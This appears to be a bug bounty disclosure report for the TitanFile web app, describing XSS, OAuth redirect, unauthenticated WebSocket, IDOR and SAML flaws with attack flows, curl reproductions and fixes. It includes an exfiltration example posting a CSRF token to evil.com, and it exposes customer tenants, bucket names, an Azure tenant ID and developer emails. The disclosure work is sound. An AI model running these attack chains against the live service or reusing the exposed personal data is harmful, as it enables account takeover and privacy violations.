# TitanFile Bug Bounty Report — app.titanfile.com

**Target:** https://app.titanfile.com  
**Program:** [Open Bug Bounty](https://www.openbugbounty.org/bugbounty/Titanfile/) | [VDP](https://www.titanfile.com/terms-policies/vulnerability-disclosure-policy/)  
**Date:** 2026-06-10  
**Researcher:** rjfs8320@gmail.com

---

## Executive Summary

Deep reconnaissance and full client-side source code audit of `app.titanfile.com` revealed **28 security vulnerabilities** including **8 CRITICAL/HIGH severity** findings. The most severe are multi-stage exploit chains combining wildcard DNS, dynamic OAuth2 redirect_uri manipulation, unsafe CSP (`unsafe-inline`/`unsafe-eval`), DOM XSS sinks in the previewer, unauthenticated Socket.IO with server-trusting permission updates, and WOPI token IDOR — together enabling **full account takeover** and **cross-tenant data exfiltration**.

The application's entire client-side source code (46 unbundled JS/TS/TSX files) is publicly exposed, providing a complete blueprint of all API endpoints, permission models, admin commands, and business logic.

---

## PART I — EXPLOIT CHAINS (Highest Bounty Value)

---

## Chain #1 — DOM XSS → Account Takeover via OAuth Code Theft

**Severity: CRITICAL (CVSS 9.3)**  
**Type:** CWE-79 + CWE-601 + CWE-346 — XSS → OAuth Token Theft → Account Takeover

### Chain Components

1. **CSP allows `unsafe-inline` + `unsafe-eval`** on all authenticated pages (Finding #2)
2. **DOM XSS in previewer** — `views/previewer.js` uses `this.$('#previewer').html(this.options.html)` — direct `.html()` injection (Source Code Finding)
3. **Wildcard DNS** — `*.titanfile.com` resolves to the same server
4. **Dynamic OAuth `redirect_uri`** — changes per subdomain (Finding #0)

### Attack Flow

```
Step 1: Attacker uploads a file with crafted HTML/JS content to a shared channel
Step 2: Victim opens file preview → previewer.js renders attacker HTML via .html()
Step 3: CSP allows execution (unsafe-inline + unsafe-eval = no XSS protection)
Step 4: Injected script redirects victim to:
        https://evil-attacker.titanfile.com/login/google-oauth2/
Step 5: OAuth flow uses redirect_uri=https://evil-attacker.titanfile.com/complete/google-oauth2/
Step 6: Attacker intercepts OAuth authorization code at the callback URL
Step 7: Attacker exchanges code for victim's session → FULL ACCOUNT TAKEOVER
```

### Source Code Evidence

```javascript
// views/previewer.js — DOM XSS sink
onRender: function () {
  this.$('#previewer').html(this.options.html);  // Direct HTML injection
}

// CSP on authenticated pages (no protection):
// script-src 'self' ... 'unsafe-inline' 'unsafe-eval'

// OAuth redirect_uri follows subdomain:
// curl -sI https://evil-attacker.titanfile.com/login/google-oauth2/
// → redirect_uri=https://evil-attacker.titanfile.com/complete/google-oauth2/
```

### Impact

Complete account takeover of any user who previews a malicious file. The attacker gets the victim's OAuth authorization code and can authenticate as the victim.

---

## Chain #2 — CSWSH + Socket Permission Injection → Privilege Escalation to Admin

**Severity: CRITICAL (CVSS 9.1)**  
**Type:** CWE-306 + CWE-1275 + CWE-269 — Unauthenticated WebSocket → Permission Overwrite

### Chain Components

1. **Socket.IO accepts unauthenticated handshakes** (Finding #0.5)
2. **`permissions:update_perm_cache` event directly overwrites user permissions** from `admin/commands.js`
3. **`user:updateuserconfiguration` event overwrites user config** including admin flags from `users/models.js`
4. **`AWSALBTGCORS` cookie has `SameSite=None`** — sent cross-site to WebSocket

### Attack Flow

```
Step 1: Victim visits attacker's page
Step 2: Attacker page opens WebSocket to wss://app.titanfile.com/socket.io/
Step 3: AWSALBTGCORS cookie (SameSite=None) is sent, authenticating the connection
Step 4: Attacker emits 'permissions:update_perm_cache' with elevated permissions
Step 5: OR emits 'user:updateuserconfiguration' to set is_admin=true
Step 6: Victim's client-side permission cache is overwritten
Step 7: Victim now has admin UI access; if server trusts client-sent permission data
        in subsequent requests, attacker achieves server-side privilege escalation
```

### Source Code Evidence

```javascript
// admin/commands.js — Permission cache overwrite (no validation)
permissionsChanged: function (data) {
  const perms = new Set(data.permissions)
  TitanFile.user.set('permissions', perms);  // Blindly trusts data
}

// users/models.js — Config overwrite
updateUserConfigs: function (data) {
  for (const key in data) {
    TitanFile.user.set(key, data[key][1])  // Overwrites ANY user attribute
  }
}

// users/models.js — Subscription config overwrite
updateSubConfigs: function (data) {
  const sub = this.get('subscription');
  Object.assign(sub, updatedConfigs);  // Mass-assign subscription features
}
```

### Impact

An attacker can escalate any user to admin by injecting socket events that overwrite the permission cache. If the server relies on client-reported permissions for any operation, this achieves full privilege escalation. Even if server-side checks exist, the attacker gains access to all admin UI features (impersonation, role management, security settings, billing).

---

## Chain #3 — WOPI IDOR + Delegation Spoofing → Cross-Tenant Document Access

**Severity: HIGH (CVSS 8.1)**  
**Type:** CWE-639 + CWE-284 — IDOR + Authorization Bypass

### Chain Components

1. **WOPI file access uses UUID from URL without visible authorization** (`ms365/host-action-dialog.tsx`)
2. **`delegationUuid` is client-controlled** and sent with every channel/file operation
3. **File IDs follow predictable patterns**: `fr_<uuid>` and `mfr_<uuid>` (`files/models.js`)

### Attack Flow

```
Step 1: Attacker discovers file UUID format (fr_* / mfr_*) from source code
Step 2: Attacker crafts URL: /channels/:id/ms365/?edit=<target-file-uuid>
Step 3: ms365/host-action-dialog.tsx extracts UUID and calls getAccessToken({wopiFile: uuid})
Step 4: If server doesn't validate file ownership, attacker gets WOPI access token
Step 5: Token includes access_token, permissions, can_view, can_edit
Step 6: Attacker uses token to view/edit victim's documents via MS365 WOPI
```

### Source Code Evidence

```typescript
// ms365/host-action-dialog.tsx — UUID from URL, no auth check
const matches = queryParams.match(/(edit|view)=([^&]+)&?/);
const _uuid: string = matches[2];
token: await getAccessToken({ wopiFile: _uuid })

// The token response reveals everything:
type MsWopiAccessToken = {
    access_token: string;
    access_token_ttl: number;
    file: MsWopiFile;
    permissions: string[];
    can_view: boolean;
    can_edit: boolean;
}
```

### Impact

Unauthorized access to any document in the system via WOPI token theft. The attacker can view and potentially edit confidential legal, financial, and government documents stored in TitanFile.

---

## Chain #4 — Form-Action Wildcard + HTML Injection → CSRF Token Exfiltration → Session Hijack

**Severity: HIGH (CVSS 7.8)**  
**Type:** CWE-1021 + CWE-79 + CWE-352

### Chain Components

1. **CSP `form-action 'self' *`** allows forms to submit anywhere (Finding #1)
2. **Multiple HTML injection points** — error messages rendered with `html: true`, server error strings concatenated into DOM via `.append()` without escaping
3. **CSRF token in global `djangoVars.csrfToken`** accessible to any JS

### Attack Flow

```
Step 1: Attacker injects HTML via channel name, file name, or contact name
Step 2: Injected HTML includes: <form action="https://evil.com/steal" method="POST">
        <input name="csrf" value=""> (auto-populated by page scripts)
Step 3: form-action * in CSP allows the submission
Step 4: Attacker receives CSRF token at evil.com
Step 5: Attacker uses CSRF token to perform state-changing operations as victim
```

### Source Code Evidence

```javascript
// channels/views.js — Unescaped error injection
searchInfo.empty().removeClass('hidden').append(
  '<span>' + _t('There was an error:') + ' <span class="error">' + error + '</span></span>'
);  // 'error' from server response injected raw into DOM

// Multiple alert() calls with html:true:
TitanFile.alert('error', _t('Could not change channel status') + ': ' + err);
// If TitanFile.alert renders HTML, 'err' is an injection point

// CSP allows form submission anywhere:
// form-action 'self' *
```

---

## Chain #5 — SAML Request Tampering + Wildcard DNS → Authentication Bypass

**Severity: HIGH (CVSS 7.5)**  
**Type:** CWE-345 + CWE-287

### Chain Components

1. **SAML AuthnRequests are NOT signed** (`AuthnRequestsSigned="false"`)
2. **Wildcard DNS** means any subdomain serves SAML metadata
3. **ACS URL dynamically generated** per subdomain

### Attack Flow

```
Step 1: Attacker creates SAML AuthnRequest with modified AssertionConsumerServiceURL
        pointing to attacker-controlled subdomain (e.g., evil.titanfile.com)
Step 2: Since requests are unsigned, IdP cannot verify the ACS URL is legitimate
Step 3: IdP authenticates user and sends SAML Response to evil.titanfile.com/saml2/acs/
Step 4: Wildcard DNS resolves evil.titanfile.com to TitanFile server
Step 5: If TitanFile processes the assertion for any subdomain's ACS,
        attacker intercepts the SAML assertion containing user identity
```

---

## PART II — INDIVIDUAL SOURCE CODE FINDINGS

---

## Finding #SC-1 — DOM XSS via Previewer HTML Injection

**Severity: HIGH (CVSS 7.6)**  
**Type:** CWE-79 — Stored Cross-site Scripting

### Description

`views/previewer.js` renders HTML content directly into the DOM without sanitization:

```javascript
onRender: function () {
  this.$('#previewer').html(this.options.html);
}
```

If file preview content or any upstream data contains malicious HTML/JavaScript, it executes in the authenticated user's session context. Combined with `unsafe-inline`/`unsafe-eval` CSP, there is zero protection.

### Impact

Stored XSS via malicious file uploads. Attacker can steal session cookies (if HttpOnly is ever relaxed), access all channel data, send messages as victim, or chain with OAuth for account takeover.

---

## Finding #SC-2 — Socket Events Blindly Overwrite User Permissions and Config

**Severity: HIGH (CVSS 7.5)**  
**Type:** CWE-269 — Improper Privilege Management

### Description

Multiple socket event handlers in `users/models.js` and `admin/commands.js` directly overwrite user state without validation:

```javascript
// admin/commands.js
permissionsChanged: function (data) {
  const perms = new Set(data.permissions)
  TitanFile.user.set('permissions', perms);
}

// users/models.js
updateUserConfigs: function (data) {
  for (const key in data) {
    TitanFile.user.set(key, data[key][1])
  }
}

updateSubConfigs: function (data) {
  const sub = this.get('subscription');
  Object.assign(sub, updatedConfigs);
}
```

### Impact

If Socket.IO messages can be injected (via CSWSH or compromised connection), an attacker can set `is_admin=true`, enable premium features, or modify any user attribute.

---

## Finding #SC-3 — Client-Side Permission Model Controls Server Requests

**Severity: HIGH (CVSS 7.2)**  
**Type:** CWE-602 — Client-Side Enforcement of Server-Side Security

### Description

Permission values (`is_admin`, `allow_upload`, `allow_download`) are determined client-side and sent as parameters in socket emissions:

```javascript
// channels/views.js
contact_args['is_admin'] = ['is-admin'].indexOf(privs) > -1;
contact_args['allow_upload'] = ['is-admin', 'allow-upload'].indexOf(privs) > -1;
contact_args['allow_download'] = ['is-admin', 'allow-upload', 'allow-download'].indexOf(privs) > -1;
```

Channel options including `registrationless` (open access) and `password_required` are enforced only in the UI:

```javascript
// When registrationless_force_password is set, password is enforced via:
$('#password_required').prop('disabled', true);  // Client-side only!
```

### Impact

An attacker can intercept/modify socket emissions to grant themselves admin permissions on any channel, bypass password requirements on open-access channels, or enable premium features their subscription doesn't include.

---

## Finding #SC-4 — Impersonation Management Route Has No Permission Gate

**Severity: HIGH (CVSS 7.0)**  
**Type:** CWE-862 — Missing Authorization

### Description

In `settings/routes.tsx`, the user impersonation management route is rendered unconditionally — no client-side permission check:

```jsx
<Route path="user-impersonation/*" element={<ImpersonationManagement />} />
```

Compare with the roles route which at least has `utils.checkPermission()`:

```jsx
const rolesRoutes = utils.checkPermission(["tf_permissions.tf_view_roles_management"]) ? (
    <Route path="roles" .../>
) : null;
```

### Impact

If server-side authorization is weak or missing, any authenticated user could access `/settings/user-impersonation/` and impersonate other users, gaining access to their channels, files, and contacts.

---

## Finding #SC-5 — IDOR in WOPI File Access Token

**Severity: HIGH (CVSS 7.0)**  
**Type:** CWE-639 — Authorization Bypass Through User-Controlled Key

### Description

`ms365/host-action-dialog.tsx` extracts file UUID directly from URL query parameters and requests an access token:

```typescript
const matches = queryParams.match(/(edit|view)=([^&]+)&?/);
const _uuid: string = matches[2];
token: await getAccessToken({ wopiFile: _uuid })
```

No client-side ownership validation. If the `getAccessToken` API doesn't validate file access, any authenticated user can obtain WOPI tokens for any file UUID.

---

## Finding #SC-6 — HTML Injection via Unescaped Error Messages

**Severity: MEDIUM (CVSS 6.1)**  
**Type:** CWE-79 — Reflected XSS

### Description

Server error messages are injected directly into the DOM without escaping across multiple files:

```javascript
// channels/views.js
searchInfo.empty().append('<span class="error">' + error + '</span>');

// views/header.js
TitanFile.alert('error', _t('Unable to create a new channel') + ': ' + err);

// notifications/views.js
TitanFile.alert('error', _t('Failed to retrieve notices: ') + response);

// views/credeon_password.js
TitanFile.alert('error', _t('Your session has been logged out.') + ' <a href="/login/?next=' 
  + window.location.pathname + '">', { html: true });
```

The `window.location.pathname` injection in credeon_password.js is particularly dangerous — the `html: true` flag explicitly enables HTML rendering.

---

## Finding #SC-7 — Virus Scan Bypass After 5-Second Timeout

**Severity: MEDIUM (CVSS 6.0)**  
**Type:** CWE-693 — Protection Mechanism Failure

### Description

In `files/models.js`, after 5 seconds the user is offered the option to skip virus scanning:

```javascript
this.skipVirusScanTimer = setTimeout(() => {
  if (this.get('scanning')) {
    this.confirmSkipScan = TitanFile.confirm({
      text: _t('virus_scanning', { 'fileName': this.get('name') }),
      type: 'virusScan'
    });
    this.confirmSkipScan['promise'].done(() => {
      this.downloadPromise.resolve();  // Download proceeds without scan
    });
  }
}, 5000);
```

Additionally, archive downloads accept `skip_virus_scan: true`:

```javascript
socket.emit('files:buildarchive', Object.assign({}, params, { skip_virus_scan: true }), ...);
```

### Impact

Attacker uploads malware designed to make ClamAV scan slowly (>5 seconds). Recipient clicks "skip scan" and downloads the malicious file.

---

## Finding #SC-8 — BCC Channel Contact Enumeration (Privacy Bypass)

**Severity: MEDIUM (CVSS 5.8)**  
**Type:** CWE-200 — Information Disclosure

### Description

BCC channel contact search restriction is client-side only:

```javascript
} else if (bccChan && !isAdmin) {
  TitanFile.alert('error', _t("Sorry, you don't have enough permissions..."));
}
```

The `channels:showmorecontacts` socket event can be called directly to enumerate all contacts in a BCC channel.

### Impact

Violates the BCC privacy guarantee — a participant can discover all other participants in a channel meant to be blind.

---

## Finding #SC-9 — Password Hash Stored in Global Scope

**Severity: MEDIUM (CVSS 5.5)**  
**Type:** CWE-312 — Cleartext Storage of Sensitive Information

### Description

```javascript
// views/credeon_password.js
TitanFile.credeonpw = hash;  // SHA-256 of password on global object
console.log('csrf', csrftoken);  // CSRF token logged to console
```

The SHA-256 hash of the user's Credeon encryption password is stored on the global `TitanFile` object, accessible to any JS on the page (including browser extensions, analytics scripts, and XSS payloads). The CSRF token is also logged to the browser console.

---

## Finding #SC-10 — IDOR on 2FA Scratch Codes

**Severity: MEDIUM (CVSS 5.4)**  
**Type:** CWE-639 — Authorization Bypass Through User-Controlled Key

### Description

```jsx
// settings/routes.tsx
<Route path="users/:id/2fa/scratchcodes">
    <Route index element={<TwoFactorScratchCodes />} />
</Route>
```

2FA scratch codes are accessible via `/settings/users/:id/2fa/scratchcodes` with the user ID in the URL. If server-side doesn't strictly validate admin access for the target user ID, any authenticated user could view/reset another user's 2FA backup codes.

---

## Finding #SC-11 — Delegation UUID Spoofing in Channel Creation

**Severity: MEDIUM (CVSS 5.4)**  
**Type:** CWE-284 — Improper Access Control

### Description

```javascript
// views/header.js
channelData.delegationUuid = data.delegationUuid;
channelData.owner = data.owner;
socket.emit('channels:create', channelData, ...);
```

Channel creation sends a `delegationUuid` and `owner` object. If the server doesn't validate delegation rights, an attacker could create channels as any user.

---

## Finding #SC-12 — PDF Preview Token in URL Query String

**Severity: MEDIUM (CVSS 4.8)**  
**Type:** CWE-598 — Use of GET Request Method with Sensitive Query Strings

### Description

```javascript
// channels/files/views.js
url += '?token=' + data['token'];
```

Preview tokens are appended as URL query parameters, appearing in browser history, server logs, and Referrer headers.

---

## Finding #SC-13 — Console Logging of Sensitive Data

**Severity: LOW (CVSS 3.5)**  
**Type:** CWE-532 — Information Exposure Through Log Files

### Description

Multiple files log sensitive data to the browser console:

```javascript
console.log('csrf', csrftoken);          // views/credeon_password.js
console.log('channelData', channelData); // views/header.js (includes passwords)
console.log('doSearch of', query);       // search/views.js
console.debug(this.model.get('actor'));   // notifications/views.js
```

---

## Finding #SC-14 — Subscription Invite Uses Email as Identifier

**Severity: MEDIUM (CVSS 4.3)**  
**Type:** CWE-639 — IDOR

### Description

```javascript
// notifications/views.js
socket.emit('members_update_sub', {
    'sub_admin_email': that.model.get('actor').get('email'),
    'accept_invite': accept_invite
}, ...);
```

If the server doesn't validate that the email matches the original invite sender, an attacker could accept invites to arbitrary subscriptions.

---

## PART III — ORIGINAL FINDINGS (Reconnaissance)

---

## Finding #0 — Google OAuth2 Dynamic redirect_uri via Wildcard DNS

**Severity: CRITICAL (CVSS 8.2)**  
**Type:** CWE-601 — URL Redirection to Untrusted Site + CWE-346 — Origin Validation Error

### Description

The Google OAuth2 integration dynamically generates the `redirect_uri` based on the subdomain used to initiate the flow. Combined with wildcard DNS (`*.titanfile.com` resolves to the same server), an attacker can craft an OAuth flow with an arbitrary subdomain.

### Reproduction

```bash
curl -sI https://app.titanfile.com/login/google-oauth2/ | grep location
# redirect_uri=https://app.titanfile.com/complete/google-oauth2/

curl -sI https://evil-attacker.titanfile.com/login/google-oauth2/ | grep location
# redirect_uri=https://evil-attacker.titanfile.com/complete/google-oauth2/
```

### Google OAuth2 Client ID

```
282142653715-fblvrf56cefn2seq8vkuoec4qq11990o.apps.googleusercontent.com
```

### Impact

If Google OAuth app has wildcard redirect URIs registered, an attacker could intercept authorization codes. Combined with XSS (Chain #1), this enables full account takeover.

---

## Finding #0.5 — Unauthenticated Socket.IO Handshake (CSWSH)

**Severity: HIGH (CVSS 7.6)**  
**Type:** CWE-306 — Missing Authentication + CWE-1275 — Sensitive Cookie SameSite

### Description

The Socket.IO endpoint issues session IDs without authentication. `AWSALBTGCORS` cookie has `SameSite=None` — sent cross-site.

### Reproduction

```bash
curl -s "https://app.titanfile.com/socket.io/?EIO=4&transport=polling"
# Returns valid SID without any auth
```

### Full Socket Event Surface (from source code audit)

**Channel Events (60+):** `channels:create`, `channels:read`, `channels:readfiles`, `channels:searchfiles`, `channels:delete`, `channels:restore`, `channels:rename`, `channels:reassign`, `channels:addcontact`, `channels:addmultiplecontacts`, `channels:editcontact`, `channels:searchcontacts`, `channels:showmorecontacts`, `channels:updateoptions`, `channels:updatestatus`, `channels:updateread`, `channels:setjson`, `channels:setgetimages`, `channels:setmute`, `channels:toggledeletedfiles`, `channels:aspdf`, `channels:aszip`, `channels:readhistory`, `channels:readfolders`, `channels:readstarredfolders`, `channels:addstarredfolder`, `channels:movefoldercontents`, `channels:deletefiles`, `channels:numfilerevisions`, `channels:filerevisions`, `channels:search`, `channels:getuploadurl`, `channels:getwatermark`, `channels:setwatermark`, `channels:togglefoldertree`, `channels:autocompleteassignee`

**File Events:** `files:virusscan`, `files:buildarchive`, `files:archiveprogress`, `files:watermarkpdf`, `files:browsercomplete`

**User Events:** `user:checkbuildandauth`, `user:preparefor2fa`, `user:unshare`, `user:share`, `user:update`, `user:avatarupdate`, `user:adddelegate`, `user:removedelegate`, `user:editdelegate`, `user:adddelegatedaccount`, `user:removedelegatedaccount`, `user:editdelegatedaccountrights`, `user:newlogin`, `user:updatesubconfiguration`, `user:updateuserconfiguration`, `user:trialelevated`

**Admin Events:** `admin:enabledebug`, `admin:softlockout`, `admin:hardlockout`, `permissions:update_perm_cache`

**Other Events:** `contacts:star`, `contacts:update`, `channelcontacts:remove`, `messages:previewtoken`, `notifications:bulkdelete`, `notifications:count`, `notifications:setseen`, `invalidatecache`, `logs:createcsvreport`, `subscription:readelevationrequest`, `subscription:elevatetrial`, `subscription:requestverification`, `members_update_sub`, `esignature:envelopefilelinks`, `netdocs:checkfilelimit`

---

## Finding #1 — CSP `form-action` Wildcard

**Severity: HIGH (CVSS 7.4)**  
**Type:** CWE-1021

```
form-action 'self' *
```

Allows HTML forms to submit data to any external domain. Combined with HTML injection (Finding #SC-6), enables CSRF token and data exfiltration.

---

## Finding #2 — CSP `unsafe-inline` + `unsafe-eval` on Authenticated Pages

**Severity: HIGH (CVSS 7.1)**  
**Type:** CWE-79

```
script-src 'self' js.stripe.com *.google.com *.gstatic.com appsforoffice.microsoft.com 
ajax.aspnetcdn.com *.pendo.io *.zuora.com 'unsafe-inline' 'unsafe-eval'
```

Completely negates XSS protection. Login page uses proper nonce-based CSP — this inconsistency proves the team knows how to do it right but hasn't applied it to authenticated pages.

---

## Finding #3 — SAML SP Metadata on Any Subdomain + Unsigned Requests

**Severity: HIGH (CVSS 7.5)**  
**Type:** CWE-200 + CWE-345

`AuthnRequestsSigned="false"`, `validUntil=""`, accessible on any wildcard subdomain. See Chain #5.

### Confirmed Tenants

| Subdomain | Client |
|---|---|
| `gowlingwlgca.titanfile.com` | Gowling WLG (Canada) |
| `foley.titanfile.com` | Foley & Lardner |
| `nsuarb.titanfile.com` | NS Utility and Review Board |
| `rbcbank.titanfile.com` | RBC Bank |

---

## Finding #4 — Full Client-Side Source Code Exposed (46 Files)

**Severity: MEDIUM-HIGH (CVSS 6.5)**  
**Type:** CWE-540 — Source Code Exposure

46 unbundled, commented JavaScript/TypeScript source files publicly accessible at `/static/js/`. Complete application blueprint including all routes, API endpoints, permission models, admin commands, and integration details.

### Files

```
app.js, router.js, controller.js, utils.ts, socket.js,
channels/models.ts, channels/collections.ts, channels/views.js, channels/layout.js, channels/utils.js,
channels/messages/models.js, channels/messages/collections.js,
channels/files/collections.js, channels/files/views.js,
files/models.js, files/collections.js,
users/models.js, users/collections.js, users/views.js,
contacts/models.js, contacts/collections.js,
notifications/models.js, notifications/collections.js, notifications/views.js,
reports/collections.js, reports/views/reports.js,
models/paymentmethod.js, admin/commands.js, search/views.js,
options/layout.js, settings/routes.tsx, settings/route-config.js,
ms365/host-action-dialog.tsx,
views/header.js, views/sidebar.js, views/previewer.js, views/credeon_password.js,
views/tours/onboarding/onboarding.js, views/tours/onboarding/welcome-dialog.jsx,
alerts/models.js, alerts/views.js, confirms/views.js,
translations_french.js, translations_english.js,
libs/humanize/humanize.js, libs/jquery/jquery.nomultiplesubmit.js
```

### Developer Emails Exposed

- `taa@titanfile.com`, `hathai@titanfile.com`, `hkanaan@titanfile.com`
- `rgorrie@titanfile.com`, `mark@titanfile.com`, `vzvikaramba@titanfile.com`
- `hathai@gmail.com` (personal Gmail)

---

## Finding #5 — Customer S3 Bucket Names in CSP Headers

**Severity: MEDIUM (CVSS 5.3)**

| Bucket | Region | Client |
|---|---|---|
| `app-common-uploads` | ca-central-1 | TitanFile (shared) |
| `gowlingwlg-uploads` | ca-central-1 | Gowling WLG |
| `us-common-uploads` | us-east-1 | TitanFile (US) |
| `foley-common-upload` | us-east-1 | Foley & Lardner |
| `nsuarb-uploads` | — | NS Utility and Review Board |
| `rbcbank-uploads` | — | RBC Bank |
| `eu-common-uploads` | — | TitanFile (EU) |

---

## Finding #6 — QA Environment in Production CSP

**Severity: MEDIUM (CVSS 5.3)**

Production CSP includes `*.titanfile.qa`. The QA environment is live (`app.titanfile.qa` returns a login page).

---

## Finding #7 — SAML IdP HTTP URL + Azure AD Tenant ID

**Severity: MEDIUM (CVSS 5.4)**

- CA SAML IdP uses HTTP: `http://adfs.ca.gowlingwlg.com/adfs/services/trust`
- Azure AD Tenant ID exposed: `e47efd1d-32f2-4a84-93b3-5d6c888ee46e` (Gowling WLG UK)

---

## Finding #8 — GraphQL Endpoint Accessible

**Severity: LOW-MEDIUM (CVSS 4.3)** — `/graphql/` returns 403 (exists but requires auth)

---

## Finding #9 — Sensitive Paths Return 403 Instead of 404

**Severity: LOW (CVSS 3.1)**

`/.env` (403), `/metrics/` (403), `/media/static/uploads/branding/` (403)

---

## Finding #10 — Outdated Client-Side Libraries

**Severity: LOW (CVSS 3.1)**

jQuery UI 1.9.1 (~14 years old), Font Awesome 4.3.0 (~11 years old), Backbone.js (deprecated/EOL)

---

## Good Security Practices Found

- HSTS enabled with `includeSubdomains` and 1-year max-age
- X-Frame-Options: DENY
- X-Content-Type-Options: nosniff
- Referrer-Policy: strict-origin-when-cross-origin
- Session cookies: HttpOnly + Secure + SameSite=Lax
- CSRF token properly implemented (Django csrfmiddlewaretoken)
- Password reset does NOT enumerate users
- Login `next` parameter sanitized (rejects external URLs)
- TLS 1.3 with strong cipher suite

---

## Technology Stack

- **Backend:** Django (Python)
- **Frontend:** Backbone.js + Marionette.js (with React for newer components)
- **Real-time:** Socket.IO
- **Cloud:** AWS (ALB, S3, CloudFront) + Microsoft Azure Blob Storage
- **Auth:** Django auth + SAML 2.0 + Google OAuth2 + MS365
- **Integrations:** MS365 WOPI, DocuSign, NetDocs, Credeon (CSE)
- **Payments:** Stripe + Zuora
- **Analytics:** Pendo + Google Tag Manager

---

## Attack Surface Map

```
app.titanfile.com (*.titanfile.com wildcard DNS)
├── /login/                         (username/password + Google OAuth2)
├── /saml2/
│   ├── /login/                     (SAML SSO)
│   ├── /acs/                       (Assertion Consumer Service)
│   ├── /ls/                        (Single Logout)
│   └── /metadata/                  (SP Metadata - PUBLIC on any subdomain)
├── /graphql/                       (GraphQL API - 403 unauth)
├── /socket.io/                     (Socket.IO - 85+ events discovered)
├── /channels/:id/
│   ├── /files/*path
│   ├── /ms365/?edit=<uuid>         (WOPI document edit)
│   ├── /history/
│   ├── /options/
│   └── /contacts/
├── /settings/
│   ├── /users/:id/2fa/scratchcodes (2FA backup codes - IDOR risk)
│   ├── /user-impersonation/        (Admin - NO permission gate!)
│   ├── /roles/                     (Admin - client-side gate only)
│   ├── /security-settings/
│   ├── /manage-integration/        (DocuSign, OAuth, M365, NetDocs, SecureSend)
│   ├── /billing-and-payments/
│   └── /manage-branding/
├── /reports/
│   └── /exports/                   (CSV data export)
├── /admin/login/                   (Django admin)
├── /password/reset/
├── /checkpass/                     (Credeon password verify - plaintext)
├── /setlang/                       (Language change)
├── /extend_session/
├── /credeon-client/refreshToken/
├── /trialelevation/:id/
└── /static/js/*.js                 (46 unbundled source files)
```

---

## Recommendations Priority

| Priority | Finding | Impact |
|---|---|---|
| **P0** | Fix previewer XSS — sanitize HTML before `.html()` | Blocks Chain #1 |
| **P0** | Require auth on Socket.IO handshake, add origin validation | Blocks Chain #2 |
| **P0** | Server-side validation on `permissions:update_perm_cache` | Blocks privilege escalation |
| **P0** | Fix `form-action 'self' *` → `form-action 'self'` | Blocks Chain #4 |
| **P0** | Remove `unsafe-inline`/`unsafe-eval` from authenticated CSP | Blocks all XSS chains |
| **P1** | Validate file ownership in WOPI `getAccessToken` | Blocks Chain #3 |
| **P1** | Hardcode OAuth `redirect_uri` | Blocks Chain #1 |
| **P1** | Sign SAML AuthnRequests | Blocks Chain #5 |
| **P1** | Add server-side permission gate on `/settings/user-impersonation/` | Blocks impersonation abuse |
| **P1** | Server-side validation on `delegationUuid` | Blocks delegation spoofing |
| **P2** | Bundle/minify JavaScript, remove source files | Reduces attacker knowledge |
| **P2** | Escape all server error messages before DOM insertion | Fixes multiple XSS vectors |
| **P2** | Remove customer S3 bucket names from CSP | Reduces information disclosure |
| **P2** | Remove `*.titanfile.qa` from production CSP | Reduces attack surface |
| **P3** | Remove console.log of sensitive data | Minor info disclosure |
| **P3** | Move PDF preview tokens from URL to headers | Token leakage |
